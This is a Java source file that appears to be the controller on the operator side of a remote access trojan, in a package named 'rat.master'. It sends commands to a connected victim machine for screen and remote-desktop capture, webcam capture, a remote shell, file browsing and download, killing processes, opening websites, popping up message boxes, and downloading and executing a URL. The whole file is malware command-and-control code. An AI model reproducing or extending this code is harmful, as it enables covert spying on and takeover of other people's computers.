package rat.master;

import org.jboss.netty.channel.Channel;
import rat.master.gui.frames.*;
import rat.packets.*;

import java.lang.reflect.InvocationTargetException;
import java.util.Objects;

public class ClientController implements RemoteDesktopScreenObserver, OpenWebsiteGUIObserver,
        FileBrowserGUIObserver, ProcessListGUIObserver, ChatGUIObserver, MessageBoxGUIObserver,
        DownloadExecuteGUIObserver, RemoteShellGUIObserver, RemoteWebcamGUIObserver, WebcamListGUIObserver,
        RemoteDesktopListGUIObserver, RemoteDesktopGUIObserver {

    private Channel clientConnection;
    private FileReceiver fileReceiver;
    private ClientModel clientModel;
    private ClientView clientView;

    public ClientController(Channel clientConnection) {
        this.clientConnection = Objects.requireNonNull(clientConnection);

        this.clientModel = new ClientModel();
        this.clientView = new ClientView();

        clientView.setController(this);
        clientModel.setController(this);

        clientConnection.write(new BasicInformationRequestPacket());
    }

    /* ---- */

    public void startRemoteDesktopListGUI() {
        if (!clientView.remoteDesktopListGUIActive()) {
            try {
                clientView.openRemoteDesktopListGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getRemoteDesktopListGUI().register(this);  // za refresh

            DesktopInfoPacket requestPacket = new DesktopInfoPacket();
            clientConnection.write(requestPacket); // remote desktop list request
        }
    }

    @Override
    public void remoteDesktopSelected(String deviceName) {
        try {
            int frameId = startRemoteDesktopGUI(deviceName);
//            startRemoteDesktopRecord(frameId, deviceName);
        } catch (InvocationTargetException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void remoteDesktopListRefreshRequest() {
        DesktopInfoPacket requestPacket = new DesktopInfoPacket();
        clientConnection.write(requestPacket); // remote desktop list request
    }

    public void stopRemoteDesktopListGUI() {
        if (clientView.remoteDesktopListGUIActive()) {
            clientView.getRemoteDesktopListGUI().unregister(this);
            clientView.closeRemoteDesktopListGUI();
        }
    }

     /* ---- */

    private int startRemoteDesktopGUI(String deviceName) throws InvocationTargetException, InterruptedException {
        int frameId = clientView.openRemoteDesktopGUI(deviceName);
        clientView.getRemoteDesktopGUI(frameId).register(this);
        return frameId;
    }

    @Override
    public void startRemoteDesktopRecord(int frameId, String deviceName, int frameWidth, int frameHeight) {
        DesktopInfoPacket infoPacket = new DesktopInfoPacket();
        infoPacket.setPacketType(PacketType.DESKTOP_START);
        infoPacket.setDesktopGUIId(frameId);
        infoPacket.setFrameWidth(frameWidth);
        infoPacket.setFrameHeight(frameHeight);
        infoPacket.setDesktopDeviceName(deviceName);
        clientConnection.write(infoPacket);
    }

    @Override
    public void stopRemoteDesktopRecord(int frameId) {
        RemoteDesktopGUI desktopGUI = clientView.getRemoteDesktopGUI(frameId);
        if (desktopGUI != null) {
            DesktopInfoPacket stopPacket = new DesktopInfoPacket();
            stopPacket.setPacketType(PacketType.DESKTOP_STOP);
            stopPacket.setDesktopJobId(desktopGUI.getDesktopJobId());
            clientConnection.write(stopPacket);
        }
    }

    @Override
    public void remoteDesktopSettingsUpdated(int jobId, int frameWidth, int frameHeight) {
        DesktopInfoPacket infoPacket = new DesktopInfoPacket();
        infoPacket.setPacketType(PacketType.DESKTOP_UPDATE);
        infoPacket.setDesktopJobId(jobId);
        infoPacket.setFrameWidth(frameWidth);
        infoPacket.setFrameHeight(frameHeight);
        clientConnection.write(infoPacket);

    }

    public void stopRemoteDesktopGUI(int frameId) {
        RemoteDesktopGUI desktopGUI = clientView.getRemoteDesktopGUI(frameId);
        if (desktopGUI != null) {
            desktopGUI.unregister(this);
            clientView.closeRemoteDesktopGUI(frameId);
        }
    }

    /* ---- */

    public void startWebcamListGUI() {
        if (!clientView.webcamListGUIActive()) {
            try {
                clientView.openWebcamListGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getWebcamListGUI().register(this);  // za refresh

            WebcamInfoPacket requestPacket = new WebcamInfoPacket();
            clientConnection.write(requestPacket); // webcam list request
        }
    }

    @Override
    public void webcamSelected(String deviceName) {
        int frameId = 0;
        try {
            frameId = startWebcamGUI();
        } catch (InvocationTargetException | InterruptedException e) {
            e.printStackTrace();
            return;
        }
        startWebcamRecord(frameId, deviceName);
    }

    @Override
    public void webcamListRefreshRequest() {
        WebcamInfoPacket requestPacket = new WebcamInfoPacket();
        clientConnection.write(requestPacket); // webcam list request
    }

    public void stopWebcamListGUI() {
        if (clientView.webcamListGUIActive()) {
            clientView.getWebcamListGUI().unregister(this);
            clientView.closeWebcamListGUI();
        }
    }

    /* ---- */

    private int startWebcamGUI() throws InvocationTargetException, InterruptedException {
        int frameId = clientView.openWebcamGUI();
        clientView.getWebcamGUI(frameId).register(this);
        return frameId;
    }

    @Override
    public void startWebcamRecord(int frameId, String deviceName) {
        WebcamInfoPacket infoPacket = new WebcamInfoPacket();
        infoPacket.setPacketType(PacketType.WEBCAM_START);
        infoPacket.setWebcamGUIId(frameId);
        infoPacket.setDeviceName(deviceName);
        clientConnection.write(infoPacket);
    }

    @Override
    public void stopWebcamRecord(int frameId) {
        RemoteWebcamGUI webcamGUI = clientView.getWebcamGUI(frameId);
        if (webcamGUI != null) {
            WebcamInfoPacket stopPacket = new WebcamInfoPacket();
            stopPacket.setPacketType(PacketType.WEBCAM_STOP);
            stopPacket.setWebcamJobId(webcamGUI.getWebcamJobId());
            clientConnection.write(stopPacket);
        }
    }

    @Override
    public void webcamSettingsUpdated(int FPS, int frameWidth, int frameHeight) {
    }

    public void stopWebcamGUI(int frameId) {
        RemoteWebcamGUI webcamGUI = clientView.getWebcamGUI(frameId);
        if (webcamGUI != null) {
            webcamGUI.unregister(this);
            clientView.closeWebcamGUI(frameId);
        }
    }

    /* ---- */

    public void startScreenRecord() {
        if (!clientView.remoteDesktopScreenGUIActive()) {
            try {
                clientView.startRemoteDesktopScreenGUI();
            } catch (InvocationTargetException | InterruptedException e) {
                e.printStackTrace();
                return;
            }
            clientView.getRemoteDesktopScreen().register(this);

            clientConnection.write(new ScreenshotStartPacket(
                    RemoteDesktopScreen.DEFAULT_FPS,
                    RemoteDesktopScreen.INITIAL_FRAME_WIDTH,
                    RemoteDesktopScreen.INITIAL_FRAME_HEIGHT
            ));
        }
    }

    @Override
    public void remoteDesktopGUIUpdated(int FPS, int frameWidth, int frameHeight) {
        clientConnection.write(new ScreenshotStartPacket(FPS, frameWidth, frameHeight));
    }

    public void stopScreenRecord() {
        if (clientView.remoteDesktopScreenGUIActive()) {
            clientConnection.write(new ScreenshotStopPacket());
            clientView.getRemoteDesktopScreen().unregister(this);
            clientView.closeRemoteDesktopScreenGUI();
        }
    }

    /* ---- */

    public void openWebsiteGUI() {
        if (!clientView.websiteVisitGUIActive()) {
            try {
                clientView.openWebsiteGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getOpenWebsiteGUI().register(this);
        }
    }

    @Override
    public void websiteEntered(String url) {
        clientConnection.write(new WebsiteOpenPacket(url));
        closeWebsiteGUI();
    }

    public void closeWebsiteGUI() {
        if (clientView.websiteVisitGUIActive()) {
            clientView.getOpenWebsiteGUI().unregister(this);
            clientView.closeWebsiteGUI();
        }
    }

    /* ---- */

    public void openRemoteShellGUI() {
        if (!clientView.remoteShellGUIActive()) {
            try {
                clientView.openRemoteShellGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getRemoteShellGUI().register(this);

            RemoteShellRequestPacket requestPacket = new RemoteShellRequestPacket();
            requestPacket.startRemoteShell();
            clientConnection.write(requestPacket);
        }
    }

    @Override
    public void shellCommandEntered(String command) {
        clientConnection.write(new RemoteShellRequestPacket(command));
    }

    public void closeRemoteShellGUI() {
        if (clientView.remoteShellGUIActive()) {
            clientView.getRemoteShellGUI().unregister(this);
            clientView.closeRemoteShellGUI();

            RemoteShellRequestPacket requestPacket = new RemoteShellRequestPacket();
            requestPacket.stopRemoteShell();
            clientConnection.write(requestPacket);
        }
    }

    /* ---- */

    public void openFileBrowserGUI() {
        if (!clientView.fileBrowserGUIActive()) {
            try {
                clientView.openFileBrowserGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }

            clientView.getFileBrowserGUI().register(this);

            this.fileReceiver = new FileReceiver();
            this.fileReceiver.register(clientView.getFileBrowserGUI().getDownloadManagerTableModel());
            this.fileReceiver.start();

            clientConnection.write(new FileReceiverPacket(fileReceiver.getPort()));

            clientConnection.write(new FileBrowserPacket("list", null));
            clientConnection.write(new DriveListingPacket());
        }
    }

    @Override
    public void fileBrowserRequest(String operation, String path, String folder) {
        clientConnection.write(new FileBrowserPacket(operation, path, folder));
    }

    public void closeFileBrowserGUI() {
        if (clientView.fileBrowserGUIActive()) {

            clientConnection.write(new FileReceiverPacket(-1));

            fileReceiver.finish();
            fileReceiver.unregister(clientView.getFileBrowserGUI().getDownloadManagerTableModel());

            clientView.getFileBrowserGUI().unregister(this);
            clientView.closeFileBrowserGUI();
        }
    }

    /* ---- */

    public void openProcessListGUI() {
        if (!clientView.processListGUIActive()) {
            try {
                clientView.openProcessListGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }

            clientView.getProcessListGUI().register(this);
            clientConnection.write(new ProcessListPacket());
        }
    }

    @Override
    public void killProcess(int pid) {
        clientConnection.write(new KillProcessPacket(pid));
    }

    @Override
    public void processRefreshRequested() {
        clientConnection.write(new ProcessListPacket());
    }

    public void closeProcessListGUI() {
        if (clientView.processListGUIActive()) {
            clientView.getProcessListGUI().unregister(this);
            clientView.closeProcessListGUI();
        }
    }

    /* ---- */

    public void openChatGUI() {
        if (!clientView.chatGUIActive()) {
            try {
                clientView.openChatGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }

            clientView.getChatGUI().register(this);
        }
    }

    @Override
    public void sendChatMessage(String message) {
        clientConnection.write(new ChatMessagePacket(message));
    }

    @Override
    public void sendNudge() {
        clientConnection.write(new ChatNudgePacket());
    }

    public void closeChatGUI() {
        if (clientView.chatGUIActive()) {
            clientView.getChatGUI().unregister(this);
            clientView.closeChatGUI();
            clientConnection.write(new CloseChatPacket());
        }
    }

    /* ---- */

    public void openMessageBoxGUI() {
        if (!clientView.messageBoxGUIActive()) {
            try {
                clientView.openMessageBoxGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getMessageBoxGUI().register(this);
        }
    }

    @Override
    public void sendMessage(String title, String message, int messageBoxType) {
        clientConnection.write(new MessageBoxPacket(title, message, messageBoxType));
    }

    public void closeMessageBoxGUI() {
        if (clientView.messageBoxGUIActive()) {
            clientView.getMessageBoxGUI().unregister(this);
            clientView.closeMessageBoxGUI();
        }
    }

    /* ---- */

    public void openDownloadExecuteGUI() {
        if (!clientView.downloadExecuteGUIActive()) {
            try {
                clientView.openDownloadExecuteGUI();
            } catch (InterruptedException | InvocationTargetException e) {
                e.printStackTrace();
                return;
            }
            clientView.getDownloadExecuteGUI().register(this);
        }
    }

    @Override
    public void downloadExecuteRequest(String URL) {
        clientConnection.write(new DownloadExecutePacket(URL));
    }

    public void closeDownloadExecuteGUI() {
        if (clientView.downloadExecuteGUIActive()) {
            clientView.getDownloadExecuteGUI().unregister(this);
            clientView.closeDownloadExecuteGUI();
        }
    }

    /* ---- */

    public ClientModel getModel() {
        return clientModel;
    }

    public ClientView getView() {
        return clientView;
    }

}